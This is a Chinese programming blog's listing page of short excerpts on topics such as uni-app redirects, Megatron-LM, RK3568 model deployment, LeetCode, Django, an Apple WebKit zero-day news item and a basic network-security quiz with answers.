HTML代码部分 复制代码&lt;template&gt; &lt;view class="content"&gt; &lt;image class="logo" src="@/static/img/appIcon.png" mode="aspectFit"&gt;&lt;/image&gt; &lt;view class="text-area"&gt; &lt;text class="title"&gt;{{title}}&lt;/text&gt; &lt;/view&gt; &lt;/view&gt; &lt;/template&gt; JS代码 （引入组件 填充数据） 复制代码&lt;script&gt; export default { data() { return { title: '检测手机系统iOS/android系统跳转链接下载App' } }, mounted() { }, onLoad() { let urlStr = ''; if (this.detect() === 'ios') { //对IOS系统的移动端页面做点什么 urlStr = 'https://apps.apple.com/cn/app/' location.href = urlStr; this.title = "当前手机系统: iOS"; } else if (this.detect() === 'android') { urlStr = 'https://appgallery1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ddd4e1edfd52a604b8b077cbba7a96e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d427dcfb39c3d9f76cc391e737700d6/" rel="bookmark">
			Megatron-LM源码系列(六)：Distributed-Optimizer分布式优化器实现Part1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 使用说明 在megatron中指定--use-distributed-optimizer就能开启分布式优化器, 参数定义在megatron/arguments.py中。分布式优化器的思路是将训练中的优化器状态均匀地分布到不同数据并行的rank结点上，相当于开启ZERO-1的训练。
group.add_argument('--use-distributed-optimizer', action='store_true', help='Use distributed optimizer.') 在使用--use-distributed-optimizer, 同时会check两个参数 args.DDP_impl == 'local'(默认开启)和args.use_contiguous_buffers_in_local_ddp(默认开启)。
# If we use the distributed optimizer, we need to have local DDP # and we should make sure use-contiguous-buffers-in-local-ddp is on. if args.use_distributed_optimizer: assert args.DDP_impl == 'local' assert args.use_contiguous_buffers_in_local_ddp 分布式优化器节省的理论显存值依赖参数类型和梯度类型，以下是每一个parameter对应占用的理论字节数(d表示数据并行的size大小，也就是一个数据并行中的卡数, 等于 T P × P P TP \times PP TP×PP )：
训练数据类型Non-distributed optim（单位Byte）Distributed optim（单位Byte）float16 param, float16 grads204 + 16/dfloat16 param, fp32 grads186 + 12/dfp32 param, fp32 grads168 + 8/d 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d427dcfb39c3d9f76cc391e737700d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/788088e4974bd3fb9c80c5f93f593b59/" rel="bookmark">
			RK3568笔记七：yolov5-seg实例分割测试验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		若该文为原创文章，转载请注明原文出处。
记录的目的是想在RK3568上实现实例分割，在github的rknn_mode_zoo仓库里看到了例子，带着疑问测试了一下，结果跑通了，这里记录下全过程。
一、环境 1、硬件：正点原子ATK-DLRK3568板子
2、虚拟：使用正点提供的虚拟机
3、需要安装的工具（参考03【正点原子】ATK-DLRK3568_AI例程测试手册V1.0.pdf）：
安装交叉编译工具链
anaconda 的安装与环境配置
更新 NPU 驱动 安装 rknn-toolkit2 以上自行安装，手册里有详细的説明
二、模型转换 １、下載rknn_model_zoo https://github.com/airockchip/rknn_model_zoo 本人使用的是git方式，直接在虚拟机下操作的
git clone https://github.com/airockchip/rknn_model_zoo.git 没有VPN很难下载，自行处理。
看下目录，有很多，这里只测试yolov5_seg，也测试了ｙｏｌｏｖ８是正常的。
２、环境及模型下载 转换是在py3.8下转换的，先激活conda環境
conda activate rknn2_env rknn2_env是根据手册创建的虚拟环境
进入yolov5_seg的model目录
cd /home/alientek/rknn_model_zoo/examples/yolov5_seg/model 下載onnx模型,获取yolov5s-seg.onnx模型，模型訓練和获取会用一篇文章记录。
chmod +x download_model.sh ./download_model.sh 3、rknn模型转换 进入目录/home/alientek/rknn_model_zoo/examples/yolov5_seg/python，里面有个convert.py文件，会把onnx模型转成rknn
这里要注意，rknn-toolkit2一定要安装，py3.8一定要切换。
执行
python convert.py ../model/yolov5s-seg.onnx rk3568 i8 转换成功后的rknn在model目录下。
三、Dｅｍｏ编译 rknn_model_zoo提供了两个测试方法，一个是python, 一个是python, python可以验证onnx模型
cpp直接部署到rk3568上。
这里直接测试cpp
所以编译demo，在readme里也有介绍
即先设置交叉工具链，执行编译。
先执行下面命令，设置交叉工具链：
export GCC_COMPILER=/opt/atk-dlrk356x-toolchain/usr/bin/aarch64-buildroot-linux-gnu 返回rknn_model_zoo目录
执行执行下面命令编译demo
./build-linux.sh -t rk356x -a aarch64 -d yolov5_seg 结果保存在install目录下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/788088e4974bd3fb9c80c5f93f593b59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3bf36d94c41e3e27be223f1fc5f27a7/" rel="bookmark">
			探秘“万年历”: 久远新科技的灵感源泉
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我们每天滑动手机、点点电脑的同时,有一款神秘工具长久以来悄无声息地维护着我们生活中的时间序列——它就是“万年历”。今天,我将扮演一个技术评测者的角色,带大家走近这个表面简洁但内涵丰富的工具,揭示它的功能、性能以及用户体验。 一、功能性测评 如同它的名字所示,“万年历”提供了任意日期的信息查询功能。
除了基本的日历功能,“万年历”还集成了二十四季节气等中国传统文化元素以及公历、农历双历显示,甚至拥有国际主要城市的时差对照,再加上节假日和生肖的提醒,几乎涵盖了时间管理的所有需要。
二、性能评测 接下来进行的是调度复杂计算以确保日历数据准确无误的性能评测。在我进行了重复多次查询后,可以明显感觉到“万年历”的反应速度相当快,几乎没有出现过明显滞后,这源于其优化的处理逻辑和算法,使得操作顺滑舒适。
三、用户体验 设计简单易懂的人机界面,使用户通过直观的操作就可以理解并使用各种复杂功能,这正是“万年历”的强项。它的色彩清晰鲜艳,字体清楚明读,网页版可以在线实时查看并且界面布局也符合审美,这都极大地提升了用户体验。
改进建议 尽管“万年历”已经非常出色,但我还是有一些改进点的建议,毕竟我们对技术的追求永无止境:
更个性化: 个人仿佛看见,未来的"万年历"可以让用户自行设置主题颜色,甚至是某天标注为特殊的纪念日,使其成为一个具有较强个性化的日历工具。
更智能化: “万年历”可以集成AI算法,比如说根据用户习惯优化节假日提醒等。
总结 技术非常神奇,它把日常生活中的一部分融入到了科技产品之中,从而提升我们生活的质量和效率。“万年历”,一个可以在线使用的技术产物,紧随潮流,又不忘传统,在你我生活中举足轻重,背后包含了那些不曾被人们注意到的工程师们的辛勤付出和极致追求。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a80b471364d9892946fcbf6f8d3bc932/" rel="bookmark">
			LeetCode 1154. 一年中的第几天：2023年最后一道每日一题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【LetMeFly】1154.一年中的第几天：2023年最后一道每日一题 力扣题目链接：https://leetcode.cn/problems/day-of-the-year/
给你一个字符串 date ，按 YYYY-MM-DD 格式表示一个 现行公元纪年法 日期。返回该日期是当年的第几天。
示例 1：
输入：date = "2019-01-09" 输出：9 解释：给定日期是2019年的第九天。 示例 2：
输入：date = "2019-02-10" 输出：41 提示：
date.length == 10date[4] == date[7] == '-'，其他的 date[i] 都是数字date 表示的范围从 1900 年 1 月 1 日至 2019 年 12 月 31 日 方法一：日期处理 首先明确一年中的12个月分别有几天（以非闰年为例）：dayOfMonth = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]。
如果是闰年，那么2月有29天（dayOfMonth[1] = 29）。
怎么判断一年是否为闰年呢？
如果年份是100的倍数，则只有年份为400的倍数时为闰年否则，年份为4的倍数时为闰年 从给定字符串中，我们可以很方便地“分离出”年y月m日d，从1月到m - 1月累加这个月的天数，再加上d即为答案。
时间复杂度 O ( 1 ) O(1) O(1)，将一年的12个月视为常数空间复杂度 O ( 1 ) O(1) O(1) AC代码 C++ class Solution { private: int dayOfMonth[12] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}; bool isRunNian(int y) { if (y % 100 == 0) { return y % 400 == 0; } return y % 4 == 0; } public: int dayOfYear(string date) { int y, m, d; sscanf(date.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a80b471364d9892946fcbf6f8d3bc932/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bc6d4a064d3317f153c67b9830aaebc/" rel="bookmark">
			appium入门基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 appium支持在不同平台的UI自动化，如web,移动端,桌面端等。还支持使用java，python，js等语言编写自动化代码。主要用于自动化测试脚本，省去重复的手动操作。
Appium官网
安装 首先必须环境有Node.js用于安装Appium。
总体来说安装分为如下四步：
安装Appium 安装命令：npm i -g appium运行命令：appium,运行成功后默认监听端口是4723 安装目标平台的驱动
如果你正在自动化的应用不需要使用ChromeDriver（例如，如果你不需要测试WebView或Chrome浏览器），需要跳过ChromeDriver的安装。
- 在Windows上，你可以在系统的环境变量设置中添加APPIUM_SKIP_CHROMEDRIVER_INSTALL并将其值设置为true。
- 在Linux或macOS上，你可以在启动Appium之前在终端中运行export APPIUM_SKIP_CHROMEDRIVER_INSTALL=true
再重启appium。安装自动化脚本语言的开发环境和对应的客户端库安装其他需要的插件 Android自动化 需要安装JAVA环境并配置JAVA环境变量。
需要一个Appium Inspector用于查看移动端的页面布局，生成代码。
安装地址：Releases · appium/appium-inspector (github.com)
需要一个UiAutomator2驱动来控制移动端。
appium driver install uiautomator2 Appium Inspector的使用 安装好后启动是如下界面：
可以通过左上角的View -&gt; Languages-&gt; zh-CN,来设置中文。
{ "platformName": "Android", "automationName": "UiAutomator2" } 点击启动会话。
可以通过这个程序获取到交互的节点信息和脚本初始化代码。
可以通过会话信息获取初始化代码
还可以通过激活录制，在上面进行操作并生成对应的脚本语言
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d239d85958a7fffd551a80df94f1093a/" rel="bookmark">
			微软开源，全平台通用：Shell 自动补全工具 | 开源日报 No.132
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		microsoft/inshellisense Stars: 7.6k License: MIT
inshellisense 是一个为 Shell 提供 IDE 风格自动补全的工具。它是一个终端本地运行时自动完成，支持 600 多个命令行工具，并且可以在 Windows、Linux 和 macOS 上使用。主要功能包括安装后可通过运行 is 来启动所需 Shell 的自动补全会话，此外，在安装后还可以在 inshellisense 下进行别名设置。
支持 bash、zsh、fish 等多种 Shell可以快速开始使用适用于 node &gt;= 16.x pocketbase/pocketbase Stars: 27.9k License: MIT
PocketBase 是一个开源的 Go 后端项目，主要功能包括：
嵌入式数据库 (SQLite) 具有实时订阅内置文件和用户管理便捷的 Admin 仪表板 UI简单的 REST-ish API go-gost/gost Stars: 2.6k License: MIT
GO Simple Tunnel 是一个用 GO 语言实现的安全隧道。
主要功能包括：
多端口监听多级转发链多协议支持TCP/UDP 端口转发 其核心优势和特点包括：
插件系统Prometheus 监控指标动态配置以及 Web API 等 该项目可以作为正向代理服务访问网络，进行端口转发或者利用反向代理将内网服务暴露到公网访问。
projectdiscovery/httpx Stars: 6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d239d85958a7fffd551a80df94f1093a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6f00eb3179b7edf5d4909fbd0f56bab/" rel="bookmark">
			JSON&amp;yaml和Properties
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：取自GPT，总是忘记了，那我干脆就写一篇blog
YAML（YAML Ain’t Markup Language 或 YAML Ain’t a Markup Language）和 JSON（JavaScript Object Notation）是两种不同的数据序列化格式，尽管它们在某些方面有一些相似之处，但它们并不相同。
YAML 是一种人类可读的数据序列化格式，旨在用于配置文件和数据交换。
它使用缩进和空白来表示层次结构，而不是像 JSON 那样使用大括号和方括号。
YAML 更加注重可读性，通常比 JSON 更容易阅读和编写。
示例 YAML 文件：
name: John Doe age: 30 address: city: New York zip: '10001' 相同的数据在 JSON 中的表示：
{ "name": "John Doe", "age": 30, "address": { "city": "New York", "zip": "10001" } } JSON在postman中也需要用
YAML 在配置文件中很流行，
而 JSON 在网络通信和数据交换中常用。
Properties 文件：
语法： Properties 文件使用键值对的形式，每行一个键值对。键和值之间使用等号或冒号分隔。
用途： 主要用于 Java 应用程序的配置文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6f00eb3179b7edf5d4909fbd0f56bab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a35d485d53452c86278766e79258171/" rel="bookmark">
			oj 1.9编程基础之顺序查找 09:直方图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个非负整数数组，统计里面每一个数的出现次数。我们只统计到数组里最大的数。
假设 Fmax （Fmax &lt; 10000）是数组里最大的数，那么我们只统计 {0,1,2.....Fmax} 里每个数出现的次数。
输入
第一行n是数组的大小。1 &lt;= n &lt;= 10000。
紧接着一行是数组的n个元素。
输出
按顺序输出每个数的出现次数，一行一个数。如果没有出现过，则输出0。
对于例子中的数组，最大的数是3，因此我们只统计{0,1,2,3}的出现频数。
样例输入
5 1 1 2 3 1 样例输出
0 3 1 1 #include&lt;stdio.h&gt; #include&lt;string.h&gt; void querry(int arr[],int len) { int i,j; for(i=0;i&lt;len;i++) { for(j=0;j&lt;len-1-i;j++) { if(arr[j]&gt;arr[j+1]) { int temp=arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; } } } } int main() { int n; int i; scanf("%d",&amp;n); int arr[10000]; for(i=0;i&lt;n;i++) { scanf("%d",&amp;arr[i]); } querry(arr,n); /* for(i=0;i&lt;n;i++) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a35d485d53452c86278766e79258171/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cc1325ecbd63078f963ec1468f0005f/" rel="bookmark">
			关于“Python”Django 管理网站的核心知识点整理大全52
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
注意
18.2.2 激活模型
settings.py
18.2.3 Django 管理网站
1. 创建超级用户
注意
2. 向管理网站注册模型
admin.py
注意
3. 添加主题
Climbing。
18.2.4 定义模型 Entry
models.py
18.2.5 迁移模型 Entry
18.2.6 向管理网站注册 Entry
admin.py
往期快速传送门👆（在文章最后）：
感谢大家的支持！欢迎订阅收藏！专栏将持续更新！
我们需要告诉Django，默认应使用哪个属性来显示有关主题的信息。Django调用方法 __str__()来显示模型的简单表示。在这里，我们编写了方法__str__()，它返回存储在属性text 中的字符串（见3）。
注意 如果你使用的是Python 2.7，应调用方法__unicode__()，而不是__str__()，但其中的代 码相同。
18.2.2 激活模型 要使用模型，必须让Django将应用程序包含到项目中。为此，打开settings.py（它位于目录 learning_log/learning_log中），你将看到一个这样的片段，即告诉Django哪些应用程序安装在项 目中：
settings.py --snip-- INSTALLED_APPS = ( 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', ) --snip-- 这是一个元组，告诉Django项目是由哪些应用程序组成的。请将INSTALLED_APPS修改成下面 这样，将前面的应用程序添加到这个元组中：
--snip-- INSTALLED_APPS = ( --snip-- 'django.contrib.staticfiles', # 我的应用程序 'learning_logs', ) --snip-- 通过将应用程序编组，在项目不断增大，包含更多的应用程序时，有助于对应用程序进行跟 踪。这里新建了一个名为My apps的片段，当前它只包含应用程序learning_logs。 接下来，需要让Django修改数据库，使其能够存储与模型Topic相关的信息。为此，在终端 窗口中执行下面的命令：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cc1325ecbd63078f963ec1468f0005f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0a7fd7ac9456263d972504973b833f7/" rel="bookmark">
			苹果紧急修复两大零日漏洞，影响iPhone、iPad 和 Mac 设备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内容概述： 近日，苹果公司发布紧急安全更新，此次更新修复了两个在攻击中被利用并影响 iPhone、iPad 和 Mac 设备的零日漏洞。据统计，自今年年初以来已修复的零日漏洞数量已达到 20 个。其中提到此次发现的零日漏洞很可能已被iOS 16.7.1之前的iOS版本所利用。CVE-2023-42916 和 CVE-2023-42917这两个漏洞是在 WebKit 浏览器引擎中发现的，这两个漏洞允许攻击者通过越界读取弱点访问敏感信息，并通过恶意制作的网页在易受攻击的设备上通过内存损坏漏洞执行任意代码。苹果公司称，通过改进输入验证和锁定，解决了运行 iOS 17.1.2、iPadOS 17.1.2、macOS Sonoma 14.1.2 和 Safari 17.1.2 的设备的安全漏洞问题。受影响的苹果设备范围相当广泛，包括：iPhone XS 及更高版本、iPad Pro 12.9 英寸第二代及更高版本、iPad Pro 10.5 英寸、iPad Pro 11 英寸第一代及更高版本、iPad Air 第三代及更高版本、iPad 第六代及更高版本，以及 iPad mini 第五代及更高版本运行、macOS Monterey、Ventura 和 Sonoma 的 Mac 电脑。
研判认为： 目前苹果公司在中国的市政占有率高达21.7%，苹果公司在中国有高达五亿的用户群体。此次事件我方应高度关注，并建议苹果用户使用Firefox、Google浏览器，减少使用WebKit 浏览器的频率。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3326a56e9abfec7ff02515b6d1f50d0e/" rel="bookmark">
			C#，入门教程(01)—— Visual Studio 2022 免费安装的详细图文与动画教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过本课程的学习，你可以掌握C#编程的重点，享受编程的乐趣。
在本课程之前，你无需具备任何C#的基础知识，只要能操作电脑即可。
不过，希望你的数学不是体育老师教的。好的程序是数理化的实现与模拟。没有较好的数学基础，是不可能成为好程序员的。
一、搭建C#编程实验室 编程实验室是指在你的计算机上安装C#集成开发环境。C#集成开发环境（IDE）本身是一套软件，它帮助你编写程序，并编译使之成为可以独立运行的程序(.exe文件)，或成为可以被其他程序调用的库（一般是指动态链接库，.dll文件）。
最好的C#开发环境由微软提供，免费使用。下载地址是：
Visual Studio 2022 IDE - 适用于软件开发人员的编程工具 (microsoft.com)https://visualstudio.microsoft.com/zh-hans/vs/
1.1 下载 下载时，选择 Community 2022 版本（免费社区版本，个人学习使用足够啦。）
C#开发环境IDE的下载，实际上只是下载一个安装引导执行程序，非常小，故很快。
可以在 【下载】文件夹下找到执行文件。
1.2 开始 安装是指运行 VisualStudioSetuo.exe 的过程。双击该程序，屏幕会切换到一个确认界面。
当然，点击【是】 ！
后续才是真正的下载过程。
1.3 下载，下载 整个C#集成开发环境的程序，实际上是比较大的，因此需要较长的下载过程，好在你无需操心，只要稍微有点耐心即可。啰嗦一句，在所有开发语言中，这是最最简单的。
会跳出这个界面：
以及：
1.4 安装C#必需的板块 [] .NET 桌面开发 与 下面的 [] 通用 Windows 平台开发 两个选项都打上！
并将 红线划出内的 右侧 蓝色对勾框【 V】 选中即可。
然后点击页面右小角的 【安装（I）】按钮。
剩下的是耐心等待......
——————————————————————
POWER BY 315SOFT.COM &amp;
TRUFFER.CN
下一篇：
C#，入门教程(02)—— Visual Studio 2022开发环境搭建图文教程https://blog.csdn.net/beijinghorn/article/details/123434181
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bd2d0c8e3b423c9cd6170b535aa1ce6/" rel="bookmark">
			SpringMVC之文件上传和下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习的最大理由是想摆脱平庸，早一天就多一份人生的精彩；迟一天就多一天平庸的困扰。各位小伙伴，如果您：
想系统/深入学习某技术知识点…
一个人摸索学习很难坚持，想组团高效学习…
想写博客但无从下手，急需写作干货注入能量…
热爱写作，愿意让自己成为更好的人…
文章目录 一、文件下载二、文件上传总结 一、文件下载 使用ResponseEntity实现下载文件的功能
@RequestMapping("/testDown") public ResponseEntity&lt;byte[]&gt; testResponseEntity(HttpSession session) throws IOException { //获取ServletContext对象 ServletContext servletContext = session.getServletContext(); //获取服务器中文件的真实路径 String realPath = servletContext.getRealPath("/static/img/1.jpg"); //创建输入流 InputStream is = new FileInputStream(realPath); //创建字节数组 byte[] bytes = new byte[is.available()]; //将流读到字节数组中 is.read(bytes); //创建HttpHeaders对象设置响应头信息 MultiValueMap&lt;String, String&gt; headers = new HttpHeaders(); //设置要下载方式以及下载文件的名字 headers.add("Content-Disposition", "attachment;filename=1.jpg"); //设置响应状态码 HttpStatus statusCode = HttpStatus.OK; //创建ResponseEntity对象 ResponseEntity&lt;byte[]&gt; responseEntity = new ResponseEntity&lt;&gt;(bytes, headers, statusCode); //关闭输入流 is.close(); return responseEntity; } 二、文件上传 文件上传要求form表单的请求方式必须为post，并且添加属性enctype=“multipart/form-data”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bd2d0c8e3b423c9cd6170b535aa1ce6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c47ef57516b379a8b66f3e89edc03f1/" rel="bookmark">
			关于“Python”的核心知识点整理大全51
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
​编辑
第 18 章
Django入门
18.1 建立项目
18.1.1 制定规范
18.1.2 建立虚拟环境
18.1.3 安装 virtualenv
注意
注意
18.1.4 激活虚拟环境
注意
18.1.5 安装 Django
18.1.6 在 Django 中创建项目
注意
18.1.7 创建数据库
18.1.8 查看项目
注意
18.2 创建应用程序
18.2.1 定义模型
models.py
往期快速传送门👆（在文章最后）：
感谢大家的支持！欢迎订阅收藏！专栏将持续更新！
第 18 章 Django入门 18.1 建立项目 建立项目时，首先需要以规范的方式对项目进行描述，再建立虚拟环境，以便在其中创建项目。
18.1.1 制定规范 完整的规范详细说明了项目的目标，阐述了项目的功能，并讨论了项目的外观和用户界面。 与任何良好的项目规划和商业计划书一样，规范应突出重点，帮助避免项目偏离轨道。这里不会 制定完整的项目规划，而只列出一些明确的目标，以突出开发的重点。我们制定的规范如下：
我们要编写一个名为“学习笔记”的Web应用程序，让用户能够记录感兴趣的主 题，并在学习每个主题的过程中添加日志条目。“学习笔记”的主页对这个网站进行描 述，并邀请用户注册或登录。用户登录后，就可创建新主题、添加新条目以及阅读既 有的条目。学习新的主题时，记录学到的知识可帮助跟踪和复习这些知识。优秀的应用程序让这个记录 过程简单易行。
18.1.2 建立虚拟环境 要使用Django，首先需要建立一个虚拟工作环境。虚拟环境是系统的一个位置，你可以在其 中安装包，并将其与其他Python包隔离。将项目的库与其他项目分离是有益的，且为了在第20章 将“学习笔记”部署到服务器，这也是必须的。
为项目新建一个目录，将其命名为learning_log，再在终端中切换到这个目录，并创建一个虚 拟环境。如果你使用的是Python 3，可使用如下命令来创建虚拟环境：
learning_log$ python -m venv ll_env learning_log$ 这里运行了模块venv，并使用它来创建一个名为ll_env的虚拟环境。如果这样做管用，请跳 到后面的18.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c47ef57516b379a8b66f3e89edc03f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1148f7bc885e4e55a2bc7afb8610025/" rel="bookmark">
			FPGA和DSP的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 FPGA与DSP FPGA与DSP的区别（粗略整理） https://blog.csdn.net/clara_d/article/details/82355397
ARM,DSP,FPGA三者比较 csdn链接
DSP是通用的信号处理器，用软件实现数据处理；FPGA用硬件实现数据处理。DSP成本低，算法灵活，功能性强，而FPGA的实时性好，成本较高，FPGA适合于控制功能算法简单且含有大量重复计算的工程使用，DSP适合于控制功能复杂且含有大量计算任务的工程应用。
DSP是软件实现算法，FPGA是硬件实现算法，所以FPGA的处理速度会更高；FPGA比DSP快的一个重要原因是FPGA可以实现并行运算，而DSP由于硬件结构条件限制，主要还是依靠软件来提取指令执行，理解为还是串行执行的。
001_区分单片机、arm、DSP、FPGA(零基础也能区分) csdn链接
哪些产品非常适合使用FPGA
数字信号处理器（DSP）：FPGA在数字信号处理方面表现出色，因此它被广泛应用于音频和视频处理，无线电和通信系统等DSP应用中。
高性能计算：FPGA的并行处理能力和高速IO接口使其成为加速计算的理想选择。FPGA可用于加速各种计算任务，例如图像处理、神经网络加速、金融模型等
网络加速器：随着云计算和网络虚拟化的发展，FPGA作为网络加速器被广泛采用。FPGA可以加速各种网络功能，例如防火墙、负载均衡、数据包过滤等。
汽车电子：FPGA可用于汽车电子应用，例如驾驶员辅助系统（ADAS）、发动机控制和车载娱乐系统等。FPGA的可编程性和高度定制化使其成为汽车电子应用的理想选择。
军事和航空电子：FPGA可用于各种军事和航空应用，例如雷达、导航、通信和电子对抗系统等。FPGA的高度可编程性和可靠性使其成为这些应用的理想选择。
ZYNQ7000 ZYNQ7000开发平台用户手册 pdf http://www.alinx.com/public/upload/file/AC7021B_UG.pdf
ZYNQ 芯片的 PS 系统集成了两个 ARM Cortex™-A9 处理器， AMBA®互连，内部存储器，外部存储器接口和外设。ZYNQ 芯片的 FPGA 内部含有丰富的 可编程逻辑单元，DSP 和内部 RAM ZYNQ-7000概述 https://blog.csdn.net/weixin_42837669/article/details/114992927 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12c2d7f5a3b0f95795e9f080f948d9e4/" rel="bookmark">
			1、aigc图像相关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		aigc图像相关 一、Diffusion webui 在autodl上部署一些问题二、lora和kohyass（1）角色模型（2）风格模型（3）dreambooth（4）模型合并（5）Lora加Adetail其他 三、sd api四、ai视频模型五、换脸六、voice2face七、clash代理八、3090、cuda和tensorflow 1.x八、 Nvidia显卡驱动、CUDA、cuDNN、Anaconda及Tensorflow-GPU版本九、显卡信息命令/CPU内存/硬盘1.显卡2、CPU内存3、硬盘4、查看进程5、释放显存 十、文生视频十一、数字人十二、 flask socket十三、图像超分辨率模型（ video Super Resolution）十四、GUI十五、调试十六、ftp1、安装启动状态2、配置3、创建用户 与 目录的分配4、windows远程连接5、PASV模式6、报错 十七、TTSBert-VITS2训练 常用Linux命令1、 conda复制环境2、压缩3、ffmpeg4、conda换源5、conda相关命令6、shell启动python虚拟环境7、终端目录说明界面（terminal）8、修改huggingface 目录 Python 常用操作1.清空文件夹2.格式化字符串f() python中 r'', b'', u'', f'' 的含义3、python设置临时环境变量4、vars将类转成字典5、交互窗口，jupy6、数据保存json7、任意路径导包8、Python 全局异常处理 sys.excepthook （路由和进程捕获不了）9、将Python控制台输出保存到文件的方法10、python info日志11、 traceback 异常信息 到控制台12、多队列线程13、python执行脚本当前相对目录附： python代码常用函数 python模型库1、accelerate2、os.system和subprocess（多进程模型训练1）3、多进程spawn、fork、forkserver （多进程模型训练2）4、python multiprocessing 如何在主进程中捕获子进程抛出的异常5、requests和request6、gradio UI库 一、Diffusion webui 在autodl上部署一些问题 1、虚拟环境中的pip要更新和换源
python -m pip install --upgrade pip
pip install pip -U
pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/
python -m pip install --upgrade pip
pip config set global.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12c2d7f5a3b0f95795e9f080f948d9e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f204c91eebf32814d3148b5778998df/" rel="bookmark">
			网络安全试题——附答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络安全 什么是最常见的网络安全攻击类型？
A. 病毒B. DoS 攻击C. 社会工程学D. 逻辑炸弹 以下哪个是一种主动攻击？
A. 恶意软件B. 社会工程学C. DoS 攻击D. 防火墙 什么是 DDOS 攻击的特点？
A. 利用多个系统攻击一个目标系统B. 通过恶意软件获取敏感信息C. 通过社会工程学获得访问权限D. 在单台计算机上暴力破解密码 哪种加密技术常用于在互联网上安全地传输数据？
A. SHAB. MD5C. SSL/TLSD. CRC 什么是双因素身份验证？
A. 使用用户名和密码B. 使用生物识别特征和密码C. 使用安全问题和密码D. 使用数字证书和密码 什么是钓鱼攻击？
A. 使用大量伪造的数据包淹没网络B. 在网络上偷窥敏感信息C. 伪装成合法实体以欺骗用户D. 通过未经授权的访问获取系统权限 以下哪项是保护计算机系统免受恶意软件的措施？
A. 防火墙B. 电子邮件C. 网络D. 电缆 什么是黑客？
A. 对网络进行安全检查的专家B. 企图违规访问计算机系统的人C. 网络管理员D. 安全顾问 什么是网络针对特定系统或网络的诈骗攻击？
A. 病毒B. 木马C. 社会工程学D. 雷达攻击 常见的网络威胁模式中，信息窃取属于哪种类型？
A. 拒绝服务攻击B. 逻辑炸弹C. 间谍软件D. 钓鱼攻击 答案：
什么是最常见的网络安全攻击类型？
答案：B. DoS 攻击 以下哪个是一种主动攻击？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f204c91eebf32814d3148b5778998df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
